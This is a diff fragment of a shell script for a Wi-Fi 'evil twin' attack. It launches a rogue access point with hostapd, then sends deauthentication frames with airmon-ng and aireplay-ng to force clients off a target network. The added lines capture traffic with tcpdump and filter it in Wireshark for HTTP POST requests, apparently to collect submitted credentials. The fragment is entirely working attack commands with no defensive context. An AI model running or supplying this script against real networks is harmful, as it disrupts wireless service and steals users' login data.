@@ -42,9 +42,11 @@ sudo hostapd hostapd.conf&
 sleep 10
 
 sudo airmon-ng start ${deauthInterface}
-#deauthInterface=$(ip a | grep "wl.*mon:" -o | cut -d: -f1)
+#deauthInterface$=$(ip a | grep "wl.*mon:" -o | cut -d: -f1)
 sudo aireplay-ng -0 50 -a ${finalBSSID} ${deauthInterface} -D
 
 sleep 20
 sudo airmon-ng stop ${deauthInterface}
 
+sudo timeout 20 tcpdump -i ${listeningInterface} -w sniff.txt 
+sudo wireshark -r sniff.txt -J "http.request.method == POST"
